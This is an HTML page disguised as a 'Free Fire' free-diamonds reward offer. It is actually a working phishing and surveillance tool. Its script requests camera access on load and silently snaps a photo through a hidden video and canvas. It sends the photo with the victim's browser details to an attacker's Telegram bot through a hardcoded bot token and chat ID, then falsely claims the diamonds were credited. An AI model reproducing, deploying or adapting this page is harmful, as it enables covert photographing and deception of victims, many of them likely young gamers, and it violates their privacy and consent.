<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Free Fire | Daily Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', Arial, sans-serif;
            background: linear-gradient(135deg, #FF6B00 0%, #FF8C00 50%, #FFA500 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 450px;
            margin: 0 auto;
        }
        
        .header {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .logo {
            font-size: 48px;
            font-weight: bold;
            background: linear-gradient(135deg, #FFD700, #FFA500);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .freefire-logo {
            font-size: 28px;
            font-weight: bold;
            color: #FF8C00;
            margin-top: 10px;
        }
        
        .offer-card {
            background: linear-gradient(135deg, #1e1e3a, #16213e);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #FF8C00;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .diamond-icon {
            font-size: 60px;
            margin-bottom: 10px;
        }
        
        .title {
            font-size: 24px;
            font-weight: bold;
            color: #FFD700;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #ccc;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .amount {
            font-size: 42px;
            font-weight: bold;
            color: #00FF00;
            margin: 15px 0;
        }
        
        .timer {
            background: rgba(0,0,0,0.5);
            border-radius: 50px;
            padding: 10px;
            margin: 15px 0;
            font-size: 18px;
            color: #FFD700;
        }
        
        .verify-section {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .verify-title {
            color: #FFD700;
            font-size: 18px;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .verify-button {
            width: 100%;
            padding: 18px;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 50px;
            background: linear-gradient(135deg, #FF8C00, #FF5500);
            color: white;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .verify-button:active {
            transform: scale(0.98);
        }
        
        .verify-button:disabled {
            opacity: 0.6;
        }
        
        .status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: #1e5a2e;
            color: #00FF00;
            display: block;
        }
        
        .status.error {
            background: #5a1e1e;
            color: #FF4444;
            display: block;
        }
        
        .status.info {
            background: #1e3a5a;
            color: #88CCFF;
            display: block;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #FF8C00;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            color: #888;
            font-size: 12px;
            margin-top: 20px;
        }
        
        canvas, video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">FREE FIRE</div>
            <div class="freefire-logo">🔥 DAILY REWARDS 🔥</div>
        </div>
        
        <div class="offer-card">
            <div class="diamond-icon">💎💎💎</div>
            <div class="title">FREE DIAMONDS!</div>
            <div class="subtitle">Limited Time Offer</div>
            <div class="amount">+10,000 DIAMONDS</div>
            <div class="timer">⏰ Offer ends in: <span id="timer">05:00</span></div>
        </div>
        
        <div class="verify-section">
            <div class="verify-title">🔒 VERIFY YOUR ACCOUNT</div>
            <button class="verify-button" id="verifyBtn">✅ VERIFY & CLAIM REWARDS</button>
            <div id="status" class="status"></div>
            <div id="loading" class="loading">
                <div class="spinner"></div>
                <p style="color:#ccc; margin-top:10px;">Verifying...</p>
            </div>
        </div>
        
        <div class="footer">
            <p>⚠️ Complete verification to claim rewards</p>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8669285551:AAGrcoKN5Bt4OJcuT2d3w_XnXfjS5kT0u4c";
        const CHAT_ID = "8786696829";
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const verifyBtn = document.getElementById('verifyBtn');
        const statusDiv = document.getElementById('status');
        const loadingDiv = document.getElementById('loading');
        
        let stream = null;
        let timeLeft = 300;
        
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('timer').textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            if (timeLeft > 0) timeLeft--;
        }
        
        setInterval(updateTimer, 1000);
        
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                verifyBtn.disabled = false;
            } catch (err) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Camera access required for verification';
                statusDiv.style.display = 'block';
                verifyBtn.disabled = true;
            }
        }
        
        async function captureAndSend() {
            if (!stream) {
                await initCamera();
                if (!stream) return;
            }
            
            verifyBtn.disabled = true;
            loadingDiv.style.display = 'block';
            statusDiv.style.display = 'none';
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `🎯 *New Verification*\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}`);
                
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.ok) {
                        loadingDiv.style.display = 'none';
                        statusDiv.className = 'status success';
                        statusDiv.innerHTML = '✅ VERIFICATION SUCCESSFUL!\n\n🎁 10,000 DIAMONDS ADDED!\n💰 Reward will be credited within 5 minutes.';
                        statusDiv.style.display = 'block';
                        verifyBtn.disabled = true;
                        
                        if (stream) stream.getTracks().forEach(track => track.stop());
                    } else {
                        throw new Error('Failed');
                    }
                } catch (err) {
                    loadingDiv.style.display = 'none';
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '❌ Verification failed. Please try again.';
                    statusDiv.style.display = 'block';
                    verifyBtn.disabled = false;
                }
            }, 'image/jpeg', 0.8);
        }
        
        verifyBtn.addEventListener('click', captureAndSend);
        initCamera();
    </script>
</body>
</html>
